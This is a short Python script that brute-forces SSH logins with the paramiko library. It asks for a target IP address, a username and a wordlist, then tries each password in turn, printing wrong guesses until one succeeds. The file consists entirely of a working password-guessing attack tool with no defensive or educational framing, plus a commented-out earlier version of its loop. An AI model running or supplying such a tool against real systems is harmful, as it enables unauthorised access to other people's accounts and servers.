#!/usr/bin/env python3

import os
import sys
import paramiko

def connect(user,host,wordlist):
  ssh = paramiko.SSHClient()
  ssh.load_system_host_keys()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  with open(wordlist) as file:
    for word in file.readlines():
      password = word.strip()
      try:
        ssh.connect(host,username=user, password=password)
      except paramiko.ssh_exception.AuthenticationException:
        print('[-] Wrong Password: {}'.format(password).strip())
      else:
        print('[+] Password Found: {}'.format(password).strip())
        break

  ssh.close()


def main():
  host = input("Enter IP Address of Target to BruteForce: ")
  user = input("Enter User Account You Want to BruteForce: ")
  wordlist = input("Enter the Path to the Wordlist You Want to Use: ")

  if not os.path.isfile(wordlist):
    print('[-] The file {} does not Exist'.format(wordlist))
    sys.exit(1)
  elif not os.access(wordlist, os.R_OK):
    print('[-] Access Denied for the file: {}'.format(wordlist))
    sys.exit(1)

  ## Calling the function
  connect(user,host,wordlist)

#  with open(wordlist) as file:
#    for password in file.readlines():
#      try:
#        connect(user,password,host)
#        print('[+] Password Found: {}'.format(password).strip())
#      except:
#        print('[-] Wrong Password: {}'.format(password).strip())
#

main()
